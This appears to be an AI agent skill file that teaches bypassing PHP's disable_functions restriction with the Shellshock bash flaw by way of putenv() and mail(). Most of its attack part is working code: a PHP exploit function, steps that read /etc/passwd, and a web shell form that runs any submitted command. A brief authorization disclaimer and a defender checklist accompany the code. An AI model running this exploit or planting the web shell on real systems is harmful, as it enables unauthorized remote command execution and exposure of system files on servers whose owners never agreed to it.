---
name: php-shellshock-bypass
description: Use this skill when pentesting PHP applications to bypass disabled_functions restrictions using the Shellshock vulnerability (CVE-2014-6271). Trigger when the user mentions PHP security testing, disabled_functions bypass, Shellshock exploitation, mail() function abuse, or needs to execute commands in restricted PHP environments. Always use for authorized security assessments only.
---

# PHP Shellshock Disabled Functions Bypass

## Overview

This skill helps you bypass PHP's `disable_functions` restriction using the Shellshock vulnerability (CVE-2014-6271) in bash. This technique exploits the `mail()` function to execute arbitrary commands even when `exec`, `system`, `shell_exec`, and similar functions are disabled.

## When This Works

This bypass is effective when:
- PHP version is 5.x (older versions)
- `/bin/sh` is linked to bash (not dash, sh, or other shells)
- The `mail()` function is NOT in `disable_functions`
- The target system has an unpatched bash vulnerable to Shellshock
- You have write access to create temporary files

## Security Context

**⚠️ AUTHORIZED USE ONLY** - This technique should only be used:
- During authorized penetration testing engagements
- On systems you own or have explicit permission to test
- For security research and educational purposes
- Never against production systems without authorization

## The Exploit Technique

### How It Works

1. **Shellshock Vulnerability**: CVE-2014-6271 allows command injection through environment variables in bash
2. **PHP Environment Variables**: PHP allows setting environment variables with `putenv()` (prefix restrictions may apply in Safe Mode)
3. **Mail Function Abuse**: The `mail()` function spawns `/bin/sh` which inherits the malicious environment variable
4. **Command Execution**: When bash processes the environment variable, it executes the injected command

### Implementation

```php
<?php

function shellshock_bypass($cmd) {
    // Check if /bin/sh is bash
    if (strstr(readlink("/bin/sh"), "bash") === false) {
        return "Not vulnerable: /bin/sh is not bash";
    }
    
    // Create temporary file for output
    $tmp = tempnam(".", "data");
    
    // Set malicious environment variable (PHP_ prefix for Safe Mode compatibility)
    putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
    
    // Trigger mail() to spawn shell with our environment
    // -bv flags prevent actual mail delivery
    mail("a@127.0.0.1", "", "", "", "", "-bv");
    
    // Read output
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    
    if ($output !== "") {
        return $output;
    } else {
        return "No output or not vulnerable";
    }
}

// Usage: shellshock_bypass("whoami");
?>
```

## Testing Steps

### 1. Check Disabled Functions

```php
<?php
echo "Disabled functions: " . ini_get('disable_functions') . "\n";
?>
```

Look for: `exec`, `system`, `shell_exec`, `passthru`, `proc_open`, `popen`

### 2. Verify Shell Type

```php
<?php
echo "Shell: " . readlink("/bin/sh") . "\n";
?>
```

Must contain "bash" for this exploit to work.

### 3. Test Mail Function

```php
<?php
if (function_exists('mail')) {
    echo "mail() is available\n";
} else {
    echo "mail() is disabled\n";
}
?>
```

### 4. Run Exploit

```php
<?php
echo shellshock_bypass("id");
echo shellshock_bypass("uname -a");
echo shellshock_bypass("cat /etc/passwd");
?>
```

## Limitations

- **PHP Version**: Only works on PHP 5.x, not PHP 7+
- **Bash Version**: Requires unpatched bash (pre-4.2 or unpatched 4.2+)
- **Safe Mode**: May require `PHP_` prefix on environment variables
- **Mail Configuration**: Some mail configurations may block the `-bv` flags
- **Output Capture**: Relies on file I/O, which may be restricted

## Detection & Mitigation

### For Defenders

1. **Patch Bash**: Update bash to patched version
2. **Disable mail()**: Add `mail` to `disable_functions`
3. **Use Modern PHP**: Upgrade to PHP 7+ or 8+
4. **Monitor**: Watch for unusual environment variable usage
5. **Chroot/Jail**: Restrict file system access

### Signs of Exploitation

- Unexpected temporary files in web directories
- Environment variables with function-like syntax
- Mail function calls with unusual parameters
- Commands executing despite disabled_functions

## Related Techniques

- **Other disabled_functions bypasses**: Look for `php://filter`, `expect`, `proc_open` alternatives
- **PHP wrappers**: `php://input`, `php://filter` for data exfiltration
- **Safe Mode bypasses**: Various techniques for older PHP versions

## References

- [Original Blog Post](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)
- [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
- [PHP disable_functions](https://www.php.net/manual/en/ini.core.php#ini.disable-functions)
- [PHP Safe Mode](https://www.php.net/manual/en/ini.core.php#ini.safe-mode)

## Usage in Web Shells

When building a web shell for testing:

```php
<?php
// Simple web shell with Shellshock bypass
if ($_REQUEST['cmd']) {
    echo "<pre>" . shellshock_bypass($_REQUEST['cmd']) . "</pre>";
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>
```

## Important Notes

- This is a **legacy exploit** - modern systems are unlikely to be vulnerable
- Always document findings in your penetration test report
- Consider the legal implications of using this technique
- Use as part of a comprehensive security assessment, not in isolation
